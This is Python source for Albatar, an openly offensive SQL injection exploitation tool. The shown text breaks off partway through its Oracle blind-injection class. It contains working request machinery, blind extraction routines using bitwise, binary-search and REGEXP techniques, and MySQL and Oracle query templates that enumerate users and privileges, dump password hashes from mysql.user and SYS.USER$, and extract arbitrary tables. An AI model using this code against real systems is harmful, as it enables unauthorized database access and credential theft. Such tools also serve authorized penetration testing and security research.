#!/usr/bin/env python

# Copyright (C) 2015 Sebastien MACKE
#
# This program is free software; you can redistribute it and/or modify it under
# the terms of the GNU General Public License version 2, as published by the
# Free Software Foundation
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details (http://www.gnu.org/licenses/gpl.txt).

__author__  = 'Sebastien Macke'
__email__   = 'lanjelot@gmail.com'
__url__     = 'https://github.com/lanjelot/albatar'
__twitter__ = 'https://twitter.com/lanjelot'
__version__ = '0.1'
__license__ = 'GPLv2'
__banner__  = 'Albatar v%s (%s)' % (__version__, __url__)

# logging / imports / utils {{{
import logging

fmt1 = logging.Formatter('%(asctime)s %(name)s - %(message)s', datefmt='%H:%M:%S')
fmt2 = logging.Formatter('%(asctime)s %(name)s %(levelname)7s %(threadName)s - %(message)s', datefmt='%H:%M:%S')

sh = logging.StreamHandler()
sh.setFormatter(fmt1)

fh = logging.FileHandler('albatar.log')
fh.setFormatter(fmt2)
fh.setLevel(logging.DEBUG)

logger = logging.getLogger('albatar')
logger.setLevel(logging.DEBUG)
logger.addHandler(fh)

from functools import reduce
from queue import Queue, Empty
from time import localtime, strftime, sleep, time
from threading import Thread
from urllib.parse import urlparse, urlunparse
from string import Template
import sys

missing = []
try:
  import requests
  from requests.auth import HTTPBasicAuth
  from requests.packages.urllib3.exceptions import InsecureRequestWarning
  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
  missing.append('requests')

try:
  import pycurl
  from io import StringIO
except ImportError:
  missing.append('pycurl')

if len(missing) == 2:
  logger.error('requests or pycurl required')

def pprint_seconds(seconds, fmt):
  return fmt % reduce(lambda x,y: divmod(x[0], y) + x[1:], [(seconds,), 60, 60])

def T(s, **kwargs):
  return Template(s).safe_substitute(**kwargs)

def substitute_payload(payload, *args):
  new = []
  for arg in args:
    new.append(arg.replace('${injection}', payload))
  return new

class Timing:
  def __enter__(self):
    self.t1 = time()
    return self

  def __exit__(self, exc_type, exc_value, traceback):
    self.time = time() - self.t1

# }}}

# Requester {{{
class Requester_HTTP_Base(object):

  def __init__(self, response_processor, url, method='GET', body='', headers=[],
      auth_type='basic', auth_creds='', proxies={}, ssl_cert='', encode_payload=lambda x: x,
      accepted_cookies=[]):

    self.response_processor = response_processor
    self.http_opts = [url, method, body, headers, auth_type, auth_creds, proxies, ssl_cert, accepted_cookies]
    self.encode_payload = encode_payload

  def review_response(self, payload, status_code, header_data, response_data, response_time, content_length):
    stats = '%s %d:%d %.3f' % (status_code, len(header_data+response_data), int(content_length), response_time)
    logger.debug("%s '%s'" % (stats, payload))

    return self.response_processor(header_data, response_data, response_time)

from http.cookiejar import DefaultCookiePolicy
class CustomCookiePolicy(DefaultCookiePolicy):

  def __init__(self, accepted_cookies):
    self.accepted_cookies = accepted_cookies
    DefaultCookiePolicy.__init__(self)

  def set_ok(self, cookie, request):
    if cookie.name in self.accepted_cookies:
      return DefaultCookiePolicy.set_ok(self, cookie, request)
    else:
      return False

class Requester_HTTP_requests(Requester_HTTP_Base):

  def __init__(self, *args, **kwargs):
    super(Requester_HTTP_requests, self).__init__(*args, **kwargs)

    _, _, _, _, auth_type, auth_creds, proxies, ssl_cert, accepted_cookies = self.http_opts

    auth = None
    if auth_creds:
      if auth_type == 'basic':
        u, p = auth_creds.split(':', 1)
        auth = requests.auth.HTTPBasicAuth(u, p)

    self.session = requests.Session()

    self.request_kwargs = {
      'auth': auth,
      'proxies': proxies,
      'cert': ssl_cert,
      'verify': False,
      'allow_redirects': False,
    }

    self.session.cookies.set_policy(CustomCookiePolicy(accepted_cookies))

  def test(self, payload):
    url, method, body, headers, _, _, _, _, _ = self.http_opts

    url, body, headers = substitute_payload(self.encode_payload(payload), url, body, '\r\n'.join(headers))

    headers = dict(h.split(': ', 1) for h in headers.split('\r\n') if h)

    if method.upper() == 'POST':
      headers['Content-Type'] = 'application/x-www-form-urlencoded'

    response = self.session.request(url=url, method=method, headers=headers, data=body, **self.request_kwargs)

    header_data = '\r\n'.join('%s: %s' % (k, v) for k, v in response.headers.items())

    if 'content-length' in response.headers:
      content_length = response.headers['content-length']
    else:
      content_length = -1

    return self.review_response(payload, response.status_code, header_data, response.text, response.elapsed.total_seconds(), content_length)

class Requester_HTTP_pycurl(Requester_HTTP_Base):

  def __init__(self, *args, **kwargs):
    super(Requester_HTTP_pycurl, self).__init__(*args, **kwargs)

    fp = pycurl.Curl()
    fp.setopt(pycurl.SSL_VERIFYPEER, 0)
    fp.setopt(pycurl.SSL_VERIFYHOST, 0)
    fp.setopt(pycurl.HEADER, 1)
    fp.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
    fp.setopt(pycurl.NOSIGNAL, 1)

    _, _, _, _, auth_type, auth_creds, proxies, ssl_cert, accepted_cookies = self.http_opts

    if proxies:
      fp.setopt(pycurl.PROXY, proxies['http'] or proxies['https'])

    if auth_creds:
      fp.setopt(pycurl.USERPWD, auth_creds)
      if auth_type == 'basic':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
      elif auth_type == 'digest':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_DIGEST)
      elif auth_type == 'ntlm':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
      else:
        raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
    
    if ssl_cert:
      fp.setopt(pycurl.SSLCERT, ssl_cert)

    if accepted_cookies:
      fp.setopt(pycurl.COOKIEFILE, '')

    def noop(buf):
      pass

    fp.setopt(pycurl.WRITEFUNCTION, noop)
    fp.setopt(pycurl.VERBOSE, 1)

    self.fp = fp

  def test(self, payload):
    url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert, _ = self.http_opts

    def debug_func(t, s):
      if t == pycurl.INFOTYPE_HEADER_IN:
        header_buffer.write(s)

      elif t == pycurl.INFOTYPE_DATA_IN:
        response_buffer.write(s)

    header_buffer, response_buffer = StringIO(), StringIO()

    fp = self.fp
    fp.setopt(pycurl.DEBUGFUNCTION, debug_func)

    scheme, host, path, params, query, fragment = urlparse(url)
    query, body, headers = substitute_payload(self.encode_payload(payload), query, body, '\r\n'.join(headers))

    method = method.upper()
    if method == 'GET':
      fp.setopt(pycurl.HTTPGET, 1)

    elif method == 'POST':
      fp.setopt(pycurl.POST, 1)
      fp.setopt(pycurl.POSTFIELDS, body)

    elif method == 'HEAD':
      fp.setopt(pycurl.NOBODY, 1)

    else:
      fp.setopt(pycurl.CUSTOMREQUEST, method)

    url = urlunparse((scheme, host, path, params, query, fragment))
    
    fp.setopt(pycurl.URL, url)
    fp.setopt(pycurl.HTTPHEADER, headers.split('\r\n'))
    fp.perform()

    status_code = fp.getinfo(pycurl.HTTP_CODE)
    response_time = fp.getinfo(pycurl.TOTAL_TIME) - fp.getinfo(pycurl.PRETRANSFER_TIME)
    content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
    header_data, response_data = header_buffer.getvalue(), response_buffer.getvalue()

    return self.review_response(payload, status_code, header_data, response_data, response_time, content_length)

Requester_HTTP = Requester_HTTP_requests

# }}}

# Method {{{
def make_payload(template, *args):
  payload = template

  for k, v in args:
    kw = {k: v}
    payload = T(payload, **kw)

  return payload

class Method_Base(object):

  def __init__(self, make_requester, template):
    self.make_requester = make_requester
    self.template = template

  def prepare(self, query, start_offset, stop_offset):
    start_index, stop_index = int(start_offset), int(stop_offset)

    if isinstance(query, str):
      q = query
      stop_index = 1

    else:
      if stop_index == -1:
        c, q = query

        logger.debug('query: %s' % c)
        count = ''.join(self.get_row(c))

        logger.info('count: %s' % count)
        stop_index = int(count)

    logger.debug('retrieving %d rows, starting at row %d' % (stop_index - start_index, start_index))

    return start_index, stop_index, q

class Method_Inband(Method_Base):

  def __init__(self, make_requester, template, pager=1):
    super(Method_Inband, self).__init__(make_requester, template)
    self.pager = pager

  def execute(self, query, start_offset, stop_offset):
    start_index, stop_index, q = self.prepare(query, start_offset, stop_offset)

    for row_index in range(start_index, stop_index, self.pager):
      for r in self.get_row(q, row_index, self.pager):
        yield r

  def get_row(self, query, row_pos=0, pager=1):
    requester = self.make_requester()

    payload = make_payload(self.template, ('query', query), ('row_pos', row_pos), ('row_count', pager))
    logger.debug('payload: %s' % payload)

    return requester.test(payload)

class Method_union(Method_Inband):
  pass

class Method_error(Method_Inband):
  pass

class Method_Blind(Method_Base):

  def __init__(self, make_requester, template, num_threads=7, rate_limit=0, confirm_char=True):
    super(Method_Blind, self).__init__(make_requester, template)

    self.num_threads = num_threads
    self.rate_limit = rate_limit
    self.confirm_char = confirm_char

  def execute(self, query, start_offset, stop_offset):
    self.taskq = Queue()
    self.resultq = Queue()

    for i in range(self.num_threads):
      t = Thread(target=self.consume, args=())
      t.daemon = True
      t.start()

    start_index, stop_index, q = self.prepare(query, start_offset, stop_offset)
      
    for row_index in range(start_index, stop_index):
      yield self.get_row(q, row_index)

  def get_row(self, query, row_pos):
    pass

  def get_state(self):
    while True:
      try:
        return self.resultq.get_nowait()
      except Empty:
        sleep(.1)

  def consume(self):
    requester = self.make_requester()

    while True:
      task_id, payload = self.taskq.get()
      try_count = 0

      while True:
        try_count += 1

        try:
          state = requester.test(payload)
          self.resultq.put((task_id, state))
          break

        except:
          mesg = '%s %s' % sys.exc_info()[:2]
          logger.warn('try %d, caught: %s' % (try_count, mesg))
          logger.exception(sys.exc_info()[1])

          sleep(try_count * 2)
          requester = self.make_requester()
          continue

class Method_bitwise(Method_Blind):
  '''Bit ANDing'''

  def get_row(self, query, row_pos=0):
    result = ''
    char_pos = 1

    while True:
      sleep(self.rate_limit)

      for bit_pos in range(7):
        payload = make_payload(self.template, ('query', query), ('char_pos', char_pos), ('bit_mask', 1<<bit_pos), ('row_pos', row_pos))
        self.taskq.put_nowait((bit_pos, payload))

      char = 0
      for _ in range(7):
        bit_pos, state = self.get_state()
        char |= state << bit_pos

      logger.debug('char: %r (%d)' % (chr(char), char))

      if char >= 127:
        continue

      if self.confirm_char:
        payload = make_payload(self.template, ('query', query), ('char_pos', char_pos), ('bit_mask', char), ('row_pos', row_pos))
        self.taskq.put_nowait((0, payload))

        _, state = self.get_state()
        if not state:
          requester = self.make_requester()
          logger.debug('could not confirm char')
          continue

      if char == 0:
        break

      sys.stdout.write('%s' % chr(char))
      sys.stdout.flush()

      result += chr(char)
      char_pos += 1

    sys.stdout.write('\r')
    sys.stdout.flush()

    logger.debug('row %d: %s' % (row_pos, result))
    return result

class Method_binary(Method_Blind):
  '''Binary Search'''

  def get_row(self, query, row_pos=0):
    result = ''
    char_pos = 1
    charset = [chr(i) for i in range(127)]

    while True:

      lo = 0
      hi = len(charset) - 1

      while lo <= hi:
        mid = (lo + hi) // 2

        payload = make_payload(self.template, ('query', query), ('row_pos', row_pos), ('char_pos', char_pos), ('comparator', '>'), ('char_ord', ord(charset[mid])))
        self.taskq.put_nowait((0, payload))

        _, state = self.get_state()
        if state:
          lo = mid + 1

        else:
          hi = mid - 1

      char = charset[lo]
      logger.debug('char: %r (%d)' % (char, ord(char)))

      if self.confirm_char:
        payload = make_payload(self.template, ('query', query), ('row_pos', row_pos), ('char_pos', char_pos), ('comparator', '='), ('char_ord', ord(char)))
        self.taskq.put_nowait((0, payload))

        _, state = self.get_state()
        if not state:
          requester = self.make_requester()
          logger.debug('could not confirm char')
          continue

      if char == charset[0]:
        break

      sys.stdout.write('%s' % char)
      sys.stdout.flush()

      result += char
      char_pos += 1

    sys.stdout.write('\r')
    sys.stdout.flush()

    logger.debug('row %d: %s' % (row_pos, result))
    return result

class Method_regexp(Method_Blind):
  '''MySQL REGEXP'''

  def get_row(self, query, row_pos=0):
    result = ''

    while True:
      # remove special chars like \ or ^ if getting unexpected results
      s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ._%@!^\'"#$&*+?,/:;\\<=>`~|(){}[]-\xff'

      prev_state = 0

      while len(s) > 1:

        left = s[:len(s) // 2]
        right = s[len(s) // 2:]

        regexp = '^%s[%s]' % ('.' * len(result), left)

        if False: # hex-encode if server blacklists punctuation
          regexp = '^%s[%s]' % ('.' * len(result), left.replace('\\', '\\\\'))
          regexp = '0x' + regexp.encode('utf-8').hex()
        else:
          regexp = "'^%s[%s]'" % ('.' * len(result), left.replace("'", "''").replace('\\', '\\\\\\\\'))

        payload = make_payload(self.template, ('query', query), ('regexp', regexp), ('row_pos', row_pos))
        self.taskq.put_nowait((0, payload))

        _, state = self.get_state()
        if state:
          s = left
          prev_left = left

        else:
          if prev_state == 1:
            s = prev_left[len(left):]
          else:
            s = right

        prev_state = state

      char = s[0]
      logger.debug('char: %r (%d)' % (char, ord(char)))

      if self.confirm_char:
        regexp = '0x%s' % ('^%s%s' % (result, char)).encode('utf-8').hex()
        payload = make_payload(self.template, ('query', query), ('regexp', regexp), ('row_pos', row_pos))
        self.taskq.put_nowait((0, payload))

        _, state = self.get_state()
        if not state:
          requester = self.make_requester()
          logger.debug('could not confirm char')
          continue

      if char == '\xff':
        break

      sys.stdout.write('%s' % char)
      sys.stdout.flush()

      result += char

    sys.stdout.write('\r')
    sys.stdout.flush()

    logger.debug('row %d: %s' % (row_pos, result))
    return result

# }}}

# Main {{{
class SQLi_Base:

  def __init__(self, method):
    self.method = method

  def exploit(self):
    from sys import argv
    from optparse import OptionParser, OptionGroup

    usage_str = """usage: %prog [options]
    $ %prog -q 'select 42'"""

    parser = OptionParser(usage=usage_str)

    parser.add_option('-d', '--debug', dest='debug', action='store_true', default=False, help='print debug messages')
    parser.add_option('-q', '--query', dest='query', help='SQL statement to execute')
    parser.add_option('-b', '--banner', dest='banner', action='store_true', help='return banner')
    parser.add_option('--current-user', dest='current_user', action='store_true', help='return current user')
    parser.add_option('--current-db', dest='current_db', action='store_true', help='return current database')
    parser.add_option('--hostname', dest='hostname', action='store_true', help='return server hostname')

    parser.add_option('--privileges', dest='enum_privileges', action='store_true', help='return user privileges')
    parser.add_option('--roles', dest='enum_roles', action='store_true', help='return user roles')

    parser.add_option('--users', dest='enum_users', action='store_true', help='return user names')
    parser.add_option('--passwords', dest='enum_passwords', action='store_true', help='return user passwords')

    parser.add_option('--dbs', dest='enum_dbs', action='store_true', help='return database names')
    parser.add_option('--tables', dest='enum_tables', action='store_true', help='return table names')
    parser.add_option('--columns', dest='enum_columns', action='store_true', help='return column names')
    parser.add_option('--dump', dest='dump_table', action='store_true', help='return table records')

    parser.add_option('-D', dest='db', default='', metavar='d1[,dN]*', help='database(s) to select')
    parser.add_option('-T', dest='table', default='', metavar='t1[,tN]*', help='table(s) to select')
    parser.add_option('-C', dest='column', default='', metavar='c1[,cN]*', help='column(s) to select')
    parser.add_option('-U', dest='user', default='', metavar='u1[,uN]*', help='user(s) to select')

    parser.add_option('--start', dest='start_offset', default='0', metavar='N', help='offset to start dump at')
    parser.add_option('--stop', dest='stop_offset', default='-1', metavar='N', help='offset to stop dump at')

    (opts, args) = parser.parse_args(argv[1:])

    if opts.debug:
      sh.setLevel(logging.DEBUG)
    else:
      sh.setLevel(logging.INFO)
    logger.addHandler(sh)

    queries = []

    if opts.banner:
      queries.append(self.banner())

    if opts.current_user:
      queries.append(self.current_user())

    if opts.current_db:
      queries.append(self.current_db())

    if opts.hostname:
      queries.append(self.hostname())

    if opts.enum_privileges:
      for user in opts.user.split(','):
        queries.append(self.enum_privileges(user))

    if opts.enum_roles:
      for user in opts.user.split(','):
        queries.append(self.enum_roles(user))

    if opts.enum_users:
      queries.append(self.enum_users())

    if opts.enum_passwords:
      for user in opts.user.split(','):
        queries.append(self.enum_passwords(user))

    if opts.enum_dbs:
      queries.append(self.enum_dbs())

    if opts.enum_tables:
      for db in opts.db.split(','):
        queries.append(self.enum_tables(db))

    if opts.enum_columns:
      for table in opts.table.split(','):
        queries.append(self.enum_columns(opts.db, table))

    if opts.dump_table:
      queries.append(self.dump_table(opts.db, opts.table, opts.column))

    if opts.query:
      queries.append(opts.query)

    with Timing() as timing:
      logger.info('Starting %s at %s' % (__banner__, strftime('%Y-%m-%d %H:%M %Z', localtime())))
      try:
        for query in queries:
          logger.info('Executing: %s' % repr(query))
          for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
            yield result
      except KeyboardInterrupt:
        print()

    logger.info("Time: %s" % pprint_seconds(timing.time, '%dh %dm %ds'))

# }}}

# MySQL_Inband {{{
class MySQL_Inband(SQLi_Base):

  def banner(self):
    return '(SELECT VERSION() X)a'

  def current_user(self):
    return '(SELECT CURRENT_USER() X)a'

  def current_db(self):
    return '(SELECT DATABASE() X)a'

  def hostname(self):
    return '(SELECT @@HOSTNAME X)a'

  def enum_privileges(self, user):
    if user:
      c = '(SELECT COUNT(*) X FROM information_schema.user_privileges WHERE grantee="%s")a' % user
      q = '(SELECT privilege_type X FROM information_schema.user_privileges WHERE grantee="%s" LIMIT ${row_pos},${row_count})a' % user
    else:
      c = '(SELECT COUNT(*) X FROM information_schema.user_privileges)a'
      q = '(SELECT CONCAT_WS(0x3a,grantee,privilege_type) X FROM information_schema.user_privileges LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_users(self):
    c = '(SELECT COUNT(DISTINCT(grantee)) X FROM information_schema.user_privileges)a'
    q = '(SELECT DISTINCT(grantee) X FROM information_schema.user_privileges LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_passwords(self, user):
    if user:
      c = '(SELECT COUNT(*) X FROM mysql.user WHERE user="%s")a' % user
      q = '(SELECT CONCAT_WS(0x3a,host,user,password) X FROM mysql.user WHERE user="%s" LIMIT ${row_pos},${row_count})a' % user
    else:
      c = '(SELECT COUNT(*) X FROM mysql.user)a'
      q = '(SELECT CONCAT_WS(0x3a,host,user,password) X FROM mysql.user LIMIT ${row_pos},${row_count})a'

    return c, q

  def enum_dbs(self):
    c = '(SELECT COUNT(*) X FROM information_schema.schemata)a'
    q = '(SELECT schema_name X FROM information_schema.schemata LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_tables(self, db):
    if db:
      c = '(SELECT COUNT(*) X FROM information_schema.tables WHERE table_schema="%s")a' % db
      q = '(SELECT table_name X FROM information_schema.tables WHERE table_schema="%s" LIMIT ${row_pos},${row_count})a' % db

    else:
      c = '(SELECT COUNT(*) X FROM information_schema.tables)a'
      q = '(SELECT CONCAT_WS(0x3a,table_schema,table_name) X FROM information_schema.tables LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_columns(self, db, table):
    if db:
      if table:
        c = '(SELECT COUNT(*) X FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s")a' % (db, table)
        q = '(SELECT column_name X FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" LIMIT ${row_pos},${row_count})a' % (db, table)
      else:
        c = '(SELECT COUNT(*) X FROM information_schema.columns WHERE table_schema="%s")a' % db
        q = '(SELECT CONCAT_WS(0x3a,table_name,column_name) X FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},${row_count})a' % db
    else:
      c = '(SELECT COUNT(*) X FROM information_schema.columns)a'
      q = '(SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) X FROM information_schema.columns LIMIT ${row_pos},${row_count})a'
    return c, q

  def dump_table(self, db, table, cols):
    if not (db and table and cols):
      raise NotImplementedError('-D, -T and -C required')

    c = '(SELECT COUNT(*) X FROM %s.%s)a' % (db, table)
    q = '(SELECT CONCAT_WS(0x3a,%s) X FROM %s.%s LIMIT ${row_pos},${row_count})a' % (','.join(cols.split(',')), db, table)
    return c, q

# }}}

# MySQL_Blind {{{
class MySQL_Blind(SQLi_Base):
  
  def banner(self):
    return 'SELECT VERSION()'

  def current_user(self):
    return 'SELECT CURRENT_USER()'

  def current_db(self):
    return 'SELECT DATABASE()'

  def hostname(self):
    return 'SELECT @@HOSTNAME'

  def enum_privileges(self, user):
    if not user:
      raise NotImplementedError('-U required')

    c = 'SELECT COUNT(DISTINCT(privilege_type)) FROM information_schema.user_privileges WHERE grantee="%s"' % user
    q = 'SELECT DISTINCT(privilege_type) FROM information_schema.user_privileges WHERE grantee="%s" LIMIT ${row_pos},1' % user
    return c, q

  def enum_users(self):
    c = 'SELECT COUNT(DISTINCT(grantee)) FROM information_schema.user_privileges'
    q = 'SELECT DISTINCT(grantee) FROM information_schema.user_privileges LIMIT ${row_pos},1'
    return c, q

  def enum_passwords(self, user):
    if not user:
      c = 'SELECT COUNT(DISTINCT(CONCAT_WS(0x3a,user,password))) FROM mysql.user'
      q = 'SELECT DISTINCT(CONCAT_WS(0x3a,user,password)) FROM mysql.user LIMIT ${row_pos},1'
    else:
      c = 'SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user="%s"' % user
      q = 'SELECT DISTINCT(password) FROM mysql.user WHERE user="%s" LIMIT ${row_pos},1' % user
    return c, q

  def enum_dbs(self):
    c = 'SELECT COUNT(schema_name) FROM information_schema.schemata'
    q = 'SELECT schema_name FROM information_schema.schemata LIMIT ${row_pos},1'
    return c, q

  def enum_tables(self, db):
    if db:
      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema="%s"' % db
      q = 'SELECT table_name FROM information_schema.tables WHERE table_schema="%s" LIMIT ${row_pos},1' % db
    else:
      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema' \
          ' NOT IN ("information_schema","mysql","performance_schema")'
      q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name) FROM information_schema.tables WHERE table_schema' \
          ' NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
    return c, q

  def enum_columns(self, db, table):
    if db:
      if table:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s"' % (db, table)
        q = 'SELECT column_name FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" LIMIT ${row_pos},1' % (db, table)
      else:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema="%s"' % db
        q = 'SELECT CONCAT_WS(0x3a,table_name,column_name) FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},1' % db
    else:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")'
        q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
    return c, q

  def dump_table(self, db, table, cols):
    if not (db and table and cols):
      raise NotImplementedError('-D, -T and -C required')

    c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
    q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols.split(',')), db, table)
    return c, q

# }}}

# Oracle_Inband {{{
class Oracle_Inband(SQLi_Base):

  def banner(self):
    c = "(SELECT UPPER(COUNT(*)) X FROM v$version)"
    q = "(SELECT banner X,ROWNUM R FROM v$version) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
    return c, q

  def current_user(self):
    return "(SELECT user X FROM dual)"

  def hostname(self):
    return "(SELECT UTL_INADDR.GET_HOST_NAME X FROM dual)"

  def enum_privileges(self, user):
    if user:
      c = "(SELECT UPPER(COUNT(*)) FROM DBA_SYS_PRIVS WHERE GRANTEE='%s')" % user.upper()
      q = "(SELECT PRIVILEGE X,ROWNUM R FROM DBA_SYS_PRIVS WHERE GRANTEE='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % user.upper()
    else:
      c = "(SELECT UPPER(COUNT(*)) FROM USER_SYS_PRIVS)"
      q = "(SELECT PRIVILEGE X,ROWNUM R FROM USER_SYS_PRIVS WHERE GRANTEE='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"

    return c, q

  def enum_roles(self, user):
    if user:
      c = "(SELECT UPPER(COUNT(*)) FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s'" % user.upper()
      q = "(SELECT GRANTED_ROLE X,ROWNUM R FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count)" % user.upper()
    else:
      c = "(SELECT UPPER(COUNT(*)) FROM USER_ROLE_PRIVS"
      q = "(SELECT GRANTED_ROLE X,ROWNUM R FROM USER_ROLE_PRIVS) WHERE R>${row_pos} AND R<=${row_pos}+${row_count)"
    return c, q

  def enum_users(self):
    c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_USERS)"
    q = "(SELECT USERNAME X,ROWNUM R FROM SYS.ALL_USERS) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
    return c, q

  def enum_passwords(self, user):
    if user:
      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.USER$ WHERE NAME='%s')" % user.upper()
      q = "(SELECT PASSWORD X,ROWNUM R FROM SYS.USER$ WHERE NAME='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % user.upper()
    else:
      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.USER$)"
      q = "(SELECT NAME||CHR(58)||PASSWORD X,ROWNUM R FROM SYS.USER$) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
    return c, q

  def enum_dbs(self):
    c = "(SELECT UPPER(COUNT(*)) X FROM DISTINCT(OWNER) FROM SYS.ALL_TABLES)"
    q = "(SELECT OWNER X, ROWNUM R FROM DISTINCT(OWNER) FROM SYS.ALL_TABLES) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
    return c, q

  def enum_tables(self, db):
    if db:
      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TABLES WHERE OWNER='%s')" % db.upper()
      q = "(SELECT TABLE_NAME X,ROWNUM R FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % db.upper()
    else:
      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TABLES)"
      q = "(SELECT OWNER||CHR(58)||TABLE_NAME X,ROWNUM R FROM SYS.ALL_TABLES) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
    return c, q

  def enum_columns(self, db, table):
    if db:
      if table:
        c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s')" % (table.upper(), db.upper())
        q = "(SELECT COLUMN_NAME X,ROWNUM R FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % (table.upper(), db.upper())
      else:
        c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='%s')" % db.upper()
        q = "(SELECT TABLE_NAME||CHR(58)||COLUMN_NAME X,ROWNUM R FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % db.upper()
    else:
        c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TAB_COLUMNS)"
        q = "(SELECT OWNER||CHR(58)||TABLE_NAME||CHR(58)||COLUMN_NAME X,ROWNUM R FROM SYS.ALL_TAB_COLUMNS) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
    return c, q

  def dump_table(self, db, table, cols):
    if not (table and cols):
      raise NotImplementedError('-T and -C required')

    if db:
      c = '(SELECT UPPER(COUNT(*)) X FROM %s.%s)' % (db, table)
      q = '(SELECT %s X,ROWNUM R FROM %s.%s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols.split(',')), db, table)
    else:
      c = '(SELECT UPPER(COUNT(*)) X FROM %s)' % table
      q = '(SELECT %s X,ROWNUM R FROM %s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols.split(',')), table)
    return c, q

# }}}

# Oracle_Blind {{{
class Oracle_Blind(SQLi_Base):

  def banner(self):
    return 'SELECT banner FROM v$version WHERE ROWNUM=1'

  def current_user(self):
    return 'SELECT user FROM dual'

  def hostname(self):
    return 'SELECT UTL_INADDR.GET_HOST_NAME FROM dual'

  def enum_privileges(self, user):
    if user:
      c = "SELECT COUNT(*) FROM DBA_SYS_PRIVS WHERE GRANTEE='%s'" % user.upper()
      q = "SELECT X FROM (SELECT PRIVILEGE X,ROWNUM-1 R FROM DBA_SYS_PRIVS WHERE GRANTEE='%s') WHERE R=${row_pos}" % user.upper()
    else:
      c = "SELECT COUNT(*) FROM USER_SYS_PRIVS"
      q = "SELECT X FROM (SELECT PRIVILEGE X,ROWNUM-1 R FROM USER_SYS_PRIVS) WHERE R=${row_pos}"
    return c, q

  def enum_roles(self, user):
    if user:
      c = "SELECT COUNT(*) FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s'" % user.upper()
      q = "SELECT X FROM (SELECT GRANTED_ROLE X,ROWNUM-1 R FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s') WHERE R=${row_pos}"  % user.upper()
    else:
      c = "SELECT COUNT(*) FROM USER_ROLE_PRIVS"
      q = "SELECT X FROM (SELECT GRANTED_ROLE X,ROWNUM-1 R FROM USER_ROLE_PRIVS) WHERE R=${row_pos}"
    return c, q

  def enum_users(self):
    c = 'SELECT COUNT(*) FROM SYS.ALL_USERS'
    q = 'SELECT X FROM (SELECT USERNAME X,ROWNUM-1 R FROM SYS.ALL_USERS) WHERE R=${row_pos}'
    return c, q

  def enum_passwords(self, user):
    if user:
      c = "SELECT COUNT(*) FROM SYS.USER$ WHERE NAME='%s'" % user.upper()
      q = "SELECT X FROM (SELECT PASSWORD X,ROWNUM-1 R FROM SYS.USER$ WHERE NAME='%s') WHERE R=${row_pos}" % user.upper()
    else:
